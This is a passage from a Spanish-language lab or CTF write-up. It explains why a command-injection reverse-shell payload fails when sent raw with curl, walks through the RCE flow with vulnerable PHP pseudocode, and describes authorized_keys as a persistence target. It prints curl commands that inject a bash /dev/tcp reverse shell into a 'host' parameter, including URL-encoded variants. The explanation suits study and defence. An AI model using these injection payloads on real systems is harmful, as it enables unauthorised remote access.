ExecStart=/usr/bin/python3 app.py
```

#### 3. Aislar permisos en el sistema de archivos:

Asegurar que la cuenta del servidor web solo tenga permisos de lectura estricta sobre el código fuente y no pueda interactuar con los directorios de los usuarios (`/home/*`).

---
# Explicaciones

## <font color=red>[?]</font> Por qué el payload `/bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1'` no funciona con curl?

### Problema

Cuando usamos este *payload* desde la interfaz web funciona correctamente recibiendo la conexión inversa en nuestro *listener*. No obstante, cuando tratamos de usar el mismo*payload* con `curl` obtenemos la siguiente respuesta del servidor.

```bash
curl -s -X POST http://$IP/internal/netcheck -d "host=10.0.0.5 ; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.133.253/4444 0>&1'"
```

```HTML
<form method="post" action="/internal/netcheck" class="tool">
    <input type="text" name="host" value="10.0.0.5 ; /bin/bash -c &#39;/bin/bash -i &gt;" placeholder="property host e.g. 10.0.0.5" autofocus>
	<button type="submit">Check</button>
</form>
    
<pre class="out">/bin/sh: 1: Syntax error: Unterminated quoted string
```

Se puede ver que el comando se corta de la siguiente forma: `10.0.0.5 ; /bin/bash -c &#39;/bin/bash -i &gt;`. Y la respuesta del servidor es un error de sintaxis: `/bin/sh: 1: Syntax error: Unterminated quoted string`.

### Explicación

>El truncamiento ocurre porque el carácter `&` ***es el delimitador estándar de parámetros*** en las peticiones HTTP (`application/x-www-form-urlencoded` y cadenas de consulta).

Al enviar la petición sin codificar, el servidor web interpreta el primer `&` como el final del valor de nuestro parámetro actual y asume que el texto posterior es el nombre de un nuevo parámetro.

#### Por qué funciona en el navegador pero falla con `curl`?

1. ***El navegador URL-encodifica automáticamente:***
   Cuando enviamos un formulario desde una interfaz web, el navegador transforma los caracteres reservados antes de transmitir la petición:
   
   - Los espacios se convierten en `+` o `%20`.
   - El carácter `&` se convierte en `%26`.
   - El carácter `;` se convierte en `%3B`.
   
   Al llegar al *backend*, el servidor decodifica `%26` de vuelta a `&` dentro del valor de la variable, preservando la cadena completa intacta.

2. `curl` ***envía los datos en crudo (RAW) por defecto:***
   Si ejecutamos `curl` pasando los datos directamente con `-d "host=10.0.0.5 ; ... & ..."`, `curl` no codifica los caracteres especiales. El servidor web analiza la petición de la siguiente manera:
   
   - ***Parámetro 1 recibido:*** `10.0.0.5 ; /bin/bash -c '/bin/bash -i >`
   - ***Parámetro 2 (inesperado):*** `/dev/tcp/IP_KALI/4444 0>`
   - ***Parámetro 3 (inesperado):*** `1'`
   
   Por esta razón, la app solo procesa la primera mitad de la instrucción hasta el primer `&` (qye luego visualizamos renderizado con entidades HTML como `&gt;`).

### Solución en `curl`

Para que `curl` envíe la cadena completa sin romperse, existen dos opciones habituales:

- Usar `--data-urlencode`: Delega en `curl` la codificación automática de caracteres especiales:

```bash
curl -s -X POST "http://$IP/internal/netcheck" \
--data-urlencode "host=10.0.0.5 ; /bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1'"
```

- Codificar manualmente los caracteres clave (`%26` para `&`, `%20` para espacios, `%3B` para `;`):

```bash
curl -s -X POST "http://$IP/internal/netcheck" \
-d "host=10.0.0.5%20%3B%20%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP_KALI%2F4444%200%3E%261%27"
```

## <font color=red>[?]</font> Flujo de ejecución del RCE

El vector de ataque se basa en una vulnerabilidad de ***inyección de comandos del sistema operativo*** provocada por la concatenación directa de entradas de usuario sin sanitizar dentro de una función de ejecución del *backend* (como `exec`, `system()` o `shell_exec` en PHP).

### 1. Petición y transporte (Capa Web)

- Enviamos una petición HTTP POST hacia el *endpoint* `/internal/netcheck` con el parámetro `ip` manipulado:

```
host=10.0.0.5 ; /bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1'
```

- Al viajar por la red (o enviarse vía `curl --data-urlencode`), los caracteres reservados como `;`, espacios y `&` se codifican en formato URL para llegar íntegros al servidor sin romperse.

### 2. Procesamiento en el backend (Capa de Aplicación)

- El *backend* recibe el valor del parámetro y lo almacena en una variable interna (por ejemplo, `$target_ip`).
- La aplicación construye el comando del sistema concatenando la cadena directamente, asumiendo erróneamente que la entrada siempre será una dirección IP válida:

```PHP
/* Ejemplo en PHP */

// Pseudocódigo del backend vulnerable
$cmd = "ping -c 1 " . $target_ip;
system($cmd);
```

### 3. Interpretación en el Shell (Capa del Sistema Operativo)

El intérprete de comandos (`/bin/sh` o `/bin/bash`) recibe la cadena completa y evalúa el carácter de control `;` como un ***separador secuencial de instrucciones***:
`ping -c 1 10.0.0.5 ; /bin/bash -c '...'`

### 4. Apertura del Socket y Reverse Shell (Capa de Red)

- El subproceso de Bash crea un socket TCP interactivo hacia nuestra máquina atacante (`192.168.133.253:4444`).
- Redirige la entrada estándar (`stdin`), la salida estándar (`stdout`) y los errores (`stderr`) a dicho descriptor de archivo de red ( `/dev/tcp/...`).
- En nuestro *listener* (`nc -lvnp 4444`), recibimos una shell interactiva que se ejecuta con los privilegios del usuario del servidor web (habitualmente `www-data` o `asterisk`).

## <font color=red>[?]</font> authorized_keys

>El archivo `authorized_keys` (ubicado habitualmente en `~/.ssh/authorized_keys`) es una lista de confianza utilizada por el servidor SSH para autenticar usuarios mediante ***claves públicas*** en lugar de contraseñas.

Cuando intentamos conectarnos a una máquina remota, el servidor comprueba si nuestra clave pública coincide con alguna de las registradas en este archivo para otorgarnos acceso.

- ***Función principal:*** Permite el inicio de sesión remoto sin contraseña (o protegido únicamente por la frase de paso local de nuestra clave privada), habilitando conexiones automatizadas seguras y mitigando ataques de fuerza bruta.
- ***Estructura:*** Cada línea del archivo contiene una única clave en ***Base64*** y un comentario identificativo (ej: `ssh-ed25519 AAAAC3NzaC1... usuario@equipo`).
- ***Permisos estrictos:*** Por seguridad, el archivo debe tener permisos de solo lectura/escritura para el propietario (`chmod 600 authorized_keys`) y el directorio `.ssh` debe estar protegido (`chmod 700 ~/.ssh`); de lo contrario, el *daemon* `sshd` rechazará la autenticación.
- ***Perspectiva de seguridad:***
  - *Hardening:* Permite desactivar `PasswordAuthentication` en `sshd_config`, forzando el uso exclusivo de criptografía asimétrica.
  - *Persistencia/Auditoría:* En auditorías y ejercicios ofensivos/defensivos, es un objetivo común para establecer persistencia agregando una clave controlada por un atacante.
